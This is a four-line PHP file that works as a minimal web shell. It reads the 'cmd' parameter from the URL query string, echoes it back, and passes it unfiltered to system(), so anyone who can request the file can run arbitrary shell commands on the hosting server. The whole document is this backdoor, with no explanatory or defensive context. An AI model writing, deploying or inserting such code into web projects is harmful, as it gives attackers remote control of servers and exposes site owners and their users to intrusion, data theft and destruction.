<?php
    echo "Command: ".htmlspecialchars($_GET['cmd']);
    system($_GET['cmd']);
?>
